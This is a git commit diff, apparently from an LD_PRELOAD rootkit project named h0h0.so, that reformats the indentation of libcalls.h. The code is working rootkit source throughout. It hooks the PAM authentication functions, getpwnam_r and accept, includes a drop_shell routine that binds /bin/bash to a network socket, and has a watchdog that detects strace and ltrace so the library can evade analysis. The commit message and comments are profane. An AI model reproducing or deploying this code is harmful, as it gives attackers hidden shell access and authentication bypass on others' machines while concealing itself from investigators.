3b616ea1cf439a39d25b3bb144687e23426b8174
Phizo <wfs225-dg@hotmail.com>
2014-07-24 01:55:17 +1000

    Fuck off.

--- libcalls.h
+++ libcalls.h
@@ -21,72 +21,72 @@ char lib_loaded = 1;    /* Non-constant global. Not my problem, bitch. (I'll com
 void init(void)
 {
     int i;
-	FILE *handle;
-	char caller[255];
+    FILE *handle;
+    char caller[255];
 
-	const char *libc_names[] = \
-	{
-    	"getpwnam_r",
-    	"pam_authenticate",
-    	"pam_acct_mgmt",
-    	"accept"
-	};
+    const char *libc_names[] = \
+    {
+        "getpwnam_r",
+        "pam_authenticate",
+        "pam_acct_mgmt",
+        "accept"
+    };
 
-	if((handle = fopen("/proc/self/cmdline", "r")))
-	{
-		fread(caller, sizeof(caller), 1, handle);
-		fclose(handle);
+    if((handle = fopen("/proc/self/cmdline", "r")))
+    {
+        fread(caller, sizeof(caller), 1, handle);
+        fclose(handle);
 
-		if(watchdog(caller))
-		{
-			//system("mv h0h0.so .h0h0.so");    /* Silly idea? */
-			/* freopen("/dev/null", "w", stderr); */    /* {s,l}trace writes to stderr (try something else). */
+        if(watchdog(caller))
+        {
+            //system("mv h0h0.so .h0h0.so");    /* Silly idea? */
+            /* freopen("/dev/null", "w", stderr); */    /* {s,l}trace writes to stderr (try something else). */
 
-			lib_loaded = 0;
-		}
-	}
+            lib_loaded = 0;
+        }
+    }
 
-	/* Initialise: pointers to libc functions. */
+    /* Initialise: pointers to libc functions. */
     for(i = 0; i < N_LIBCALLS; i++)
         libcalls[i] = dlsym(RTLD_NEXT, libc_names[i]);
 }
 
 void fini(void)
 {
-	if(!lib_loaded)
-	{
-		//system("mv .h0h0.so h0h0.so");
-		/* fclose(stdout); */
-	}
+    if(!lib_loaded)
+    {
+        //system("mv .h0h0.so h0h0.so");
+        /* fclose(stdout); */
+    }
 }
 
 void drop_shell(int fd)
 {
-	char *argv[] = {"/bin/bash", NULL};
-	char *envp[] = {NULL};
+    char *argv[] = {"/bin/bash", NULL};
+    char *envp[] = {NULL};
 
-	dup2(fd, 0);
-	dup2(fd, 1);
-	dup2(fd, 2);
+    dup2(fd, 0);
+    dup2(fd, 1);
+    dup2(fd, 2);
 
-	execve(argv[0], argv, envp);
+    execve(argv[0], argv, envp);
 }
 
 int watchdog(char *func)
 {
-	size_t i, wd_size;
-	const char *watchdogs[] = \
-	{
-		/* "ldd", -- bash script (caller = "/bin/bash" -- getenv("_") would be unportable [?]) */
-		"strace",
-		"ltrace"
-	};
+    size_t i, wd_size;
+    const char *watchdogs[] = \
+    {
+        /* "ldd", -- bash script (caller = "/bin/bash" -- getenv("_") would be unportable [?]) */
+        "strace",
+        "ltrace"
+    };
 
-	wd_size = sizeof watchdogs / sizeof watchdogs[0];
+    wd_size = sizeof watchdogs / sizeof watchdogs[0];
 
-	for(i = 0; i < wd_size; i++)
-		if(strncmp(watchdogs[i], func, sizeof(func)) == 0)
-			return 1;
+    for(i = 0; i < wd_size; i++)
+        if(strncmp(watchdogs[i], func, sizeof(func)) == 0)
+            return 1;
 
-	return 0;
+    return 0;
 }
